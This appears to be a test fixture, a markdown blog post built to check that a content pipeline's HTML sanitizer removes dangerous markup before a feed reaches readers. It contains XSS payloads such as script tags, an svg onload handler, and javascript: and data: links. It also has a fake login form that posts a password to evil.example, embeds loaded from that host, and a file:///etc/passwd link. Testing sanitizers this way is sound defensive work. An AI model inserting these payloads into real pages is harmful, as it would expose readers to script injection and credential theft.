---
title: Unsafe elements
---

This post deliberately contains dangerous HTML to prove the sanitizer strips
it. In a real author's hand this would never appear — but content pipelines
see weird inputs, and the sanitizer is the last line of defense before the
feed goes out to readers whose clients may run HTML quite liberally.

Enough padding to survive Defuddle's boilerplate heuristics: lorem ipsum dolor
sit amet, consectetur adipiscing elit. Nulla ac erat vel arcu gravida
consectetur. Morbi faucibus nunc et libero dignissim, non hendrerit risus
pharetra. Curabitur volutpat eros sit amet risus commodo tincidunt.

<script>alert('pwned')</script>

<style>body { background: red !important; }</style>

<form action="https://evil.example/steal" method="post">
  <input type="text" name="password" />
  <button type="submit">Log in</button>
</form>

<iframe src="https://evil.example/embed" width="600" height="400"></iframe>

<object data="https://evil.example/flash.swf"></object>
<embed src="https://evil.example/payload" />

<svg onload="alert(1)">
  <script>alert(2)</script>
</svg>

<p style="position:fixed;top:0;left:0;background:red">styled</p>

<p>
  A <a href="javascript:alert(1)">bad js link</a> and a
  <a href="data:text/html,<script>alert(1)</script>">data html link</a> and a
  <a href="file:///etc/passwd">file link</a>.
</p>

Final content paragraph so the post has substance.
